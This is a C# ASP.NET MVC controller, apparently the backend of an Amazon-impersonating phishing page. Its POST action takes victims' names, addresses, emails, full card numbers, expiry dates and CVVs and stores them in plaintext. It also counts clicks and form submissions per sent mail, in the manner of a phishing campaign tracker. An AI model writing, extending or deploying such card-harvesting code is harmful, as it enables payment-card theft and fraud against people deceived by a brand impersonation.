using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class AmazonPaymentController : Controller
    {
        private readonly RecipientModel _context;

        public AmazonPaymentController()
        {
            _context = new RecipientModel();
        }
        public ActionResult AmazonPayment()
        {
            return View();
        }

        [HttpPost]
        public ActionResult AmazonPayment(string fullname, string email, string address, string city, string state, string zipcode, string nameoncard, string creditcardnumber, string month, string year, string cvv)
        {
            var existingUser = _context.RecipientPayment.SingleOrDefault(u => u.Email == email);

            if (existingUser != null)
            {
                // Kullanıcı zaten var, sadece TotalClicks değerini 1 arttır
                existingUser.TotalClicks += 1;
                _context.SaveChanges();

                // İstediğiniz sayfaya yönlendirme yapabilirsiniz
                return RedirectToAction("Index", "Home");
            }

            var recipient = new RecipientPayment
            {
                FullName = fullname,
                Email = email,
                Address = address,
                City = city,
                State = state,
                ZipCode = zipcode,
                NameOnCard = nameoncard,
                CreditCardNumber = creditcardnumber,
                Month = month,
                Year = year,
                Cvv = cvv,
                TotalClicks = 1
            };

            var sentMailData = _context.SentMailData.OrderBy(p => p.ID).FirstOrDefault();
            sentMailData.AmazonPayInputs++;

            recipient.EnterDate = DateTime.Now;
            _context.RecipientPayment.Add(recipient);
            _context.SaveChanges();

            return RedirectToAction("Index", "Home");
        }
    }
}